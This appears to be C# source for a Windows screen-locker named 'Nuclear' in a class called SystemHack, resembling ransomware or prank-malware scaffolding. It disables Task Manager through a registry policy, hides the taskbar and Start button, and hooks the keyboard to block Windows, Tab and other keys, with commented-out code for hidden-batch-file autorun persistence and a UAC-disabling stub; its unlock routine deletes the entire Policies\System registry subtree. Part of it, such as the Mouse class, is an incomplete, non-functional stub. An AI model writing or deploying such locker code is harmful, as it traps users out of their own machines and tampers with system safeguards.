using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Nuclear
{
    public class SystemHack
    {
        private static class TaskManager
        {
            #region Control
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                try
                {
                    reg = Registry.CurrentUser.CreateSubKey(sub);
                    reg.SetValue("DisableTaskMgr", key);
                    reg.Close();
                }
                catch (Exception)
                {
                    System.Windows.Application.Current.Shutdown();
                }
            }
            public static void Unlock()
            {
                RegistryKey reg = Registry.CurrentUser;
                try
                {
                    reg.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    reg.Close();
                }
                catch (Exception)
                {
                    System.Windows.Application.Current.Shutdown();
                }
            }
            #endregion
        }
        private static class TaskBar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);
            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            private static int Handle => FindWindow("Shell_TrayWnd", "");
            private static int StartHandle => FindWindow("Button", "Пуск");
            private static void HideTaskBar() => ShowWindow(Handle, SW_HIDE);
            private static void HideStartButton() => ShowWindow(StartHandle, SW_HIDE);
            private static void ShowTaskBar() => ShowWindow(Handle, SW_SHOW);
            private static void ShowStartButton() => ShowWindow(StartHandle, SW_SHOW);

            #region Control
            public static void Lock()
            {
                HideTaskBar();
                HideStartButton();
            }
            public static void Unlock()
            {
                ShowTaskBar();
                ShowStartButton();
            }
            #endregion
        }
        private static class Keyboard
        {
            [StructLayout(LayoutKind.Sequential)]
            private struct HookStruct
            {
                public Keys key;
                public int scanCode;
                public int flags;
                public int time;
                public IntPtr extra;
            }

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern bool UnhookWindowsHookEx(IntPtr hook);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            private static extern short GetAsyncKeyState(Keys key);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(String name);

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            private static IntPtr ptrHook;
            private static LowLevelKeyboardProc KeyProcess;

            private static IntPtr CaptureKeys(int nCode, IntPtr wp, IntPtr lp)
            {
                if (nCode >= 0)
                {
                    HookStruct KeyInfo = (HookStruct)Marshal.PtrToStructure(lp, typeof(HookStruct));
                    if (KeyInfo.key == Keys.LWin || KeyInfo.key == Keys.RWin || KeyInfo.key == Keys.Tab || KeyInfo.key == Keys.Space
                        || KeyInfo.key == Keys.NumLock || KeyInfo.key == Keys.CapsLock || KeyInfo.key == Keys.Scroll
                        || KeyInfo.key == Keys.LControlKey || KeyInfo.key == Keys.LShiftKey)
                        return (IntPtr)1;
                }
                return CallNextHookEx(ptrHook, nCode, wp, lp);
            }
            #region Control
            public static void Lock()
            {
                ProcessModule CurrentModule = Process.GetCurrentProcess().MainModule;
                KeyProcess = new LowLevelKeyboardProc(CaptureKeys);
                ptrHook = SetWindowsHookEx(13, KeyProcess, GetModuleHandle(CurrentModule.ModuleName), 0);
            }
            #endregion
        }


        private static class Mouse
        {
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr _something();

        }

        /*private static class Autorun
        {
            private static string path = Application.ExecutablePath;
            private static string name = "Nuclear";
            private static string batPath = Application.StartupPath + "\\Nuclear.bat";

            #region Control
            public static void Set(bool autorun)
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
                reg = Registry.CurrentUser.CreateSubKey(sub);
                try
                {
                    if (autorun)
                    {
                        if (File.Exists("Nuclear.bat")) File.Delete("Nuclear.bat");
                        File.WriteAllText("Nuclear.bat", "@echo off\n\"" + path + "\"");
                        File.SetAttributes("Nuclear.bat", FileAttributes.Hidden);
                        reg.SetValue(name, batPath);
                    }
                    else
                    {
                        if (File.Exists("Nuclear.bat")) File.Delete("Nuclear.bat");
                        reg.DeleteValue(name);
                    }
                    reg.Close();
                }
                catch (Exception)
                {
                    System.Windows.Application.Current.Shutdown();
                }
            }
            #endregion
        }*/
        /*private static class UAC
        {            
            #region Control
            public static void Set(bool uac)
            {
                if (!uac) //disable uac;
                else //enable uac;
            }
            #endregion
        }*/

        #region MainControl
        public static void Activate()
        {
            TaskManager.Lock();
            TaskBar.Lock();
            Keyboard.Lock();
            //Autorun.Set(true);
            //UAC.Set(false);
        }
        public static void Disactivate()
        {
            TaskManager.Unlock();
            TaskBar.Unlock();
            //Autorun.Set(false);
            //UAC.Set(true);
        }
        #endregion
    }
}